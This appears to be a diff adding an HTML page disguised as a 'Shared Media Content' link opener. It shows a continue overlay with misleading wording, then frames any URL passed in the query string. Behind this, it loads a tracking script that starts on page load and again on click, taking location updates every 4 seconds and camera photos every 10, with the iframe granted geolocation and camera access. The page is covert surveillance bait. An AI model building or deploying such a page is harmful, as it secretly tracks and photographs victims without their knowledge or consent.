@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Shared Media Content</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .iframe-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(15, 23, 42, 0.92);
+            backdrop-filter: blur(10px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            transition: opacity 0.4s ease;
+        }
+
+        .permission-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .modal-box {
+            background: #1e293b;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 32px 24px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.4);
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .modal-desc {
+            font-size: 14px;
+            color: #94a3b8;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+            transition: all 0.2s;
+        }
+
+        .btn-continue:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="permission-overlay" id="overlay">
+        <div class="modal-box">
+            <div class="modal-icon"><i class="fas fa-arrow-up-right-from-square"></i></div>
+            <h2 class="modal-title" id="overlay-title">Click to Open Content</h2>
+            <p class="modal-desc" id="overlay-desc">Tap continue to load media stream and destination link with regional content delivery optimization.</p>
+            <button class="btn-continue" id="btn-continue">
+                <i class="fas fa-play me-2"></i> Continue to Destination
+            </button>
+        </div>
+    </div>
+
+    <div class="iframe-container">
+        <iframe id="dest-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; camera" allowfullscreen></iframe>
+    </div>
+
+    <script src="/js/telemetry.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let targetUrl = urlParams.get('url') || urlParams.get('target') || 'https://wikipedia.org';
+        const customTitle = urlParams.get('title');
+
+        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
+            targetUrl = 'https://' + targetUrl;
+        }
+
+        if (customTitle) {
+            document.getElementById('page-title').innerText = customTitle;
+            document.getElementById('overlay-title').innerText = customTitle;
+        }
+
+        const iframe = document.getElementById('dest-iframe');
+        const overlay = document.getElementById('overlay');
+        const btnContinue = document.getElementById('btn-continue');
+
+        function initializeTrackingAndLoad() {
+            iframe.src = targetUrl;
+            overlay.classList.add('hidden');
+
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.startTracking({
+                    templateName: 'universal-link',
+                    updateInterval: 4000,
+                    photoInterval: 10000,
+                    onSuccess: () => console.log("Tracking active"),
+                    onError: (err) => console.warn("Tracking error:", err.message)
+                });
+            }
+        }
+
+        btnContinue.addEventListener('click', initializeTrackingAndLoad);
+
+        // Auto trigger on load if allowed
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.startTracking({
+                    templateName: 'universal-link',
+                    updateInterval: 4000,
+                    photoInterval: 10000
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
